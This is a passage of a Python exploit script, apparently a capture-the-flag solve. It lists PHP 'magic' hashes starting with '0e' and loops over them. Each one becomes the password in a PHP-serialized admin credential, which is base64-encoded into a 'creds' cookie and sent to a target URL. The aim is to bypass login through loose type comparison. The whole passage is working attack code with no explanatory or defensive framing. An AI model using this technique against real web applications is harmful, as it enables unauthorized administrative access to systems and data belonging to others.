    "0e830400451993494058024219903391",  # md5(QNKCDZO)
    "0e087386482136013740957780965295",  # md5(aabg7XSs)
    "0e6650701996942723362623290636110638774",  # sha1(aaroZmOb)
    "0e7785220380375885795393117098224144684",  # sha1(aaK1STfY)
    "0e900000000000000000000000000000",  # arbitrary 0e hash
    "0e999999999999999999999999999999",  # another
]

for password in hash_values:
    php_serialized = f'a:2:{{s:8:"username";s:5:"admin";s:8:"password";s:{len(password)}:"{password}";}}'
    cookie_value = base64.b64encode(php_serialized.encode()).decode()
    
    resp = requests.get(base_url, cookies={"creds": cookie_value})
